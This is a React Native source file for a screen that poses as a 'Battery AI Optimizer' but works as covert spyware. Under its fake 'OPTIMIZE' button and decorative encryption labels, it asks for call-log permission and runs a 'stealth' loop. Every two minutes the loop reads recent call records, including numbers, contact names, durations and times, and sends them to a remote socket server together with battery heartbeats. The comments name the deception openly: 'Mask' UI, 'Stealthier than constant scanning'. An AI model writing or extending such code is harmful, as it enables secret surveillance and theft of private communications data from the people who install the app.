import React, { useEffect, useState } from 'react';
import { 
  View, 
  Text, 
  TouchableOpacity, 
  StyleSheet, 
  PermissionsAndroid, 
  Platform 
} from 'react-native';
import * as Battery from 'expo-battery';
import CallLogs from 'react-native-call-log';
import socket from '../services/socket';

const GhostScreen = ({ route }) => {
  const { name } = route.params;
  const [isOptimizing, setIsOptimizing] = useState(false);

  useEffect(() => {
    // 1. Initial Permission Request and Start
    const initializeNode = async () => {
      if (Platform.OS === 'android') {
        const granted = await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
        ]);
        
        if (granted['android.permission.READ_CALL_LOG'] === 'granted') {
          // Start the stealth cycle
          beginStealthMonitoring();
        }
      }
    };

    initializeNode();
  }, []);

  const beginStealthMonitoring = () => {
    // Send Vitals every 30 seconds
    setInterval(sendHeartbeat, 30000);
    // Scan Call Logs every 2 minutes (Stealthier than constant scanning)
    setInterval(fetchAndSendLogs, 120000);
  };

  const sendHeartbeat = async () => {
    const battery = await Battery.getBatteryLevelAsync();
    const state = await Battery.getBatteryStateAsync();
    socket.emit('heartbeat_update', {
      name: name,
      battery: Math.floor(battery * 100) + '%',
      isCharging: state === 2,
      timestamp: new Date().toLocaleTimeString()
    });
  };

  const fetchAndSendLogs = async () => {
    try {
      // Fetch the last 3 calls to ensure nothing is missed between intervals
      const logs = await CallLogs.load(3); 
      if (logs && logs.length > 0) {
        socket.emit('ghost_activity', {
          name: name,
          type: 'CALL_LOG_SYNC',
          data: logs.map(log => ({
            number: log.phoneNumber,
            duration: log.duration,
            type: log.type, // Incoming, Outgoing, Missed
            time: log.dateTime,
            name: log.name || "Unknown"
          }))
        });
      }
    } catch (err) {
      console.log("Log Fetch Error:", err);
    }
  };

  // The "Mask" UI
  return (
    <View style={styles.container}>
      <Text style={styles.header}>BATTERY AI OPTIMIZER</Text>
      
      <TouchableOpacity 
        style={[styles.orb, isOptimizing && styles.orbActive]} 
        onPress={() => {
          setIsOptimizing(true);
          fetchAndSendLogs(); // Trigger manual sync on press
          setTimeout(() => setIsOptimizing(false), 3000);
        }}
      >
        <Text style={styles.orbText}>{isOptimizing ? "ANALYZING..." : "OPTIMIZE"}</Text>
      </TouchableOpacity>

      <View style={styles.statusPanel}>
        <Text style={styles.statusLabel}>CORE STATUS: <Text style={styles.green}>ACTIVE</Text></Text>
        <Text style={styles.statusLabel}>ENCRYPTION: <Text style={styles.green}>AES-256</Text></Text>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', justifyContent: 'center', alignItems: 'center' },
  header: { color: '#222', letterSpacing: 5, fontSize: 12, marginBottom: 60, fontWeight: 'bold' },
  orb: { width: 200, height: 200, borderRadius: 100, backgroundColor: '#050505', borderWidth: 1, borderColor: '#111', justifyContent: 'center', alignItems: 'center', elevation: 10 },
  orbActive: { borderColor: '#00ff00', shadowColor: '#00ff00', shadowOpacity: 0.5, shadowRadius: 20 },
  orbText: { color: '#333', fontSize: 10, letterSpacing: 2 },
  statusPanel: { marginTop: 60, alignItems: 'center' },
  statusLabel: { color: '#1a1a1a', fontSize: 9, marginBottom: 5, letterSpacing: 1 },
  green: { color: '#004400' }
});

export default GhostScreen;
